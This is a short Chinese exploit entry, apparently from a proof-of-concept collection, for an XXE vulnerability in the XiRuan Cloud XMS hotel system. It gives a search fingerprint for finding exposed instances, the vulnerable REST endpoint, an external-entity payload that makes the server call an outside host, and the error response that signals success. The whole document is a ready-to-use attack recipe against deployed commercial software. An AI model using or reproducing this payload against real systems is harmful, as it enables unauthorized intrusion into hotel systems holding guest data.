# 西软云XMSoperateXXE漏洞

西软云XMSoperate ｜ XXE ｜ —
- **指纹**：`app="shiji-西软云XMS"`
- **请求**：`POST /XopServerRS/rest/futurehotel/operate HTTP/1.1`

**Payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://www.baidu.com"> %remote;]>
```
- **响应特征**：500